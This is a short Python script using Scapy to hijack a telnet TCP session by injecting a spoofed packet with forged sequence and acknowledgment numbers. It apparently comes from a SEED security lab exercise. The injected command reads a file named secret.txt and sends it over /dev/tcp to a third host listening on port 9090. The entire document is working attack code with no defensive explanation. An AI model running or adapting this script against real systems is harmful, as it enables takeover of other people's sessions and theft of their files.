#Python script to hijack a TCP connection

import sys
from scapy.all import *

print("Sending session hijacking packet....")
ip = IP(src="10.0.2.6", dst="10.0.2.4")
tcp = TCP(sport=60514, dport=23, flags="A", seq=78082194, ack=2295961828)
data = "\r cat /home/seed/secret.txt > /dev/tcp/10.0.2.5/9090\r"
pkt = ip/tcp/data
ls(pkt)
send(pkt,verbose=0)